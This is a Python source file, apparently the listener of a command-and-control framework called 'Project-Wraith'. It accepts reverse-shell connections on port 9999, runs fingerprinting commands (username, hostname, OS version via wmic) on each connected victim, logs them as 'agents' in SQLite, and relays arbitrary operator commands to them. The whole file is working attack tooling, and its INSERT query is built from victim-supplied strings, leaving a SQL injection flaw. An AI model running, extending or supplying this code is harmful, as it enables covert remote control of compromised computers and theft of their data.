import threading
import socket
import time
import random
import sqlite3
db = sqlite3.connect('./apps/db.sqlite3', check_same_thread=False)
# List of active connections
connections = []
# Lock thread in case got multiple connections at once
connections_lock = threading.Lock()

def socket_server():
    global connections 
    HOST = "0.0.0.0"
    PORT = 9999
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        #conn = secure_socket(conn)
        #conn.recv(2048)
        with connections_lock:
            if conn:
                ip = addr[0]
                existing_conn = next((conn for conn in connections if conn[0] == ip), None)
                if existing_conn:
                    existing_conn[1] = conn
                    existing_conn[2] = time.time()
                else:
                    print(f"[+] {ip} just joined.")
                    identifier = generate_identifier()
                    information = recv_information(conn)
                    hostname = information['hostname'][-1]
                    username = information['username'][-1]
                    osVersion = information['os_version'][-1]
                    db_ipAddr = db.execute("SELECT ipAddress FROM all_agents").fetchall()
                    ipAddr_list = [ipAddr[0] for ipAddr in db_ipAddr]
                    if ip in ipAddr_list:
                        identifier = db.execute("SELECT identifier FROM all_agents WHERE ipAddress=?",(ip,)).fetchone()
                        identifier = identifier[0]
                        db.execute("UPDATE all_agents SET status='Alive' where ipAddress=?", (ip,))
                    else:
                        query = f"INSERT into all_agents (identifier, ipAddress, hostname, username, status, lastCheckin, integrity, operatingSystem) VALUES ('{identifier}', '{ip}', '{hostname}', '{username}', 'Alive', '{str(int(time.time()-time.time())) + ' seconds ago'}', 'Low', '{osVersion}')"
                        db.execute(query)
                    db.commit()
                    client_info = [ip, conn, time.time(), username, hostname, osVersion, identifier]
                    connections.append(client_info)
                    # Handle disconnections
                    threading.Thread(target=check_connection).start()

def generate_identifier(length=5):
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    identifier = ''.join(random.choice(characters) for i in range(length))
    db_identifier = db.execute("SELECT identifier FROM all_agents").fetchall()
    identifier_list = [identity[0] for identity in db_identifier]
    if connections == [] and identifier not in identifier_list:
        return identifier
    else:
        while True:
            identifier = ''.join(random.choice(characters) for i in range(length))
            if all(conn[6] != identifier for conn in connections) and identifier not in identifier_list:
                return identifier
 
def recv_information(conn):
    information = {}
    conn.send(b"\n")
    time.sleep(1)
    conn.recv(2048)
    time.sleep(1)
    # username
    conn.send("$ENV:username".encode() + b"\n")
    time.sleep(1)
    information['username'] = conn.recv(2048).decode().replace('\r', '')
    information['username'] = information['username'].split('\n')
    information['username'].pop()
    
    # hostname
    conn.send("hostname".encode() + b"\n")
    time.sleep(1)
    information['hostname'] = conn.recv(2048).decode().replace('\r', '')
    information['hostname'] = information['hostname'].split('\n')
    information['hostname'].pop()

    # OS version
    conn.send("wmic os get version".encode() + b"\n")
    time.sleep(1)
    information['os_version'] = conn.recv(2048).decode().replace('\r', '')
    information['os_version'] = information['os_version'].split('\n')
    information['os_version'].pop()
    information['os_version'] = [empty for empty in information['os_version'] if empty]
    information['os_version'][-1] = information['os_version'][-1].strip()

    return information

def initiate(target: int, command: str):
    with connections_lock:
        conn = connections[target - 1][1]  # access connobj
        conn.send(command.encode() + b"\n")
        time.sleep(1)
        reply = conn.recv(2048).decode()
    return reply

def check_connection():
    global connections
    while True:
        for client in connections:
            conn = client[1]  # access connobj
            try:
                conn.send(b"")
                time.sleep(5)
            #If client disconnect remove from list
            except(ConnectionResetError, OSError):
                with connections_lock:
                    for client in connections:
                        if conn == client[1]:
                            print(f"[-] {client[0]} disconnected.")
                            db.execute("UPDATE all_agents SET status='Dead', lastCheckin=? where identifier=?", (time.asctime(),client[6]))
                            db.commit()
                            connections.remove(client)
                    break

# def secure_socket(conn):
#     # Create SSL Context
#     ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
#     # Load Server Cert and Private Key
#     ssl_context.load_cert_chain(certfile=r'C:\Users\user\Desktop\Wraith\Project-Wraith\src\secret\server.crt', keyfile=r'C:\Users\user\Desktop\Wraith\Project-Wraith\src\secret\server.key')
#     # Wrap Socket
#     secured_connection = ssl_context.wrap_socket(conn, server_side=True)

#     return secured_connection

